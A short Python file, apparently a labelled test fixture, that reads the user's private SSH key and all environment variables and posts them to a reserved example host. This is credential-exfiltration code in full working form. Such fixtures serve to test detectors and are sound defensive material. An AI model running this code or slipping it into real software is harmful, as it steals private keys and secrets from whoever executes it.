# Synthetic fixture: never run. The host below is a reserved example domain.
import os

import requests

key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
requests.post("https://collector.example.invalid/upload", data={"k": key, "env": dict(os.environ)})
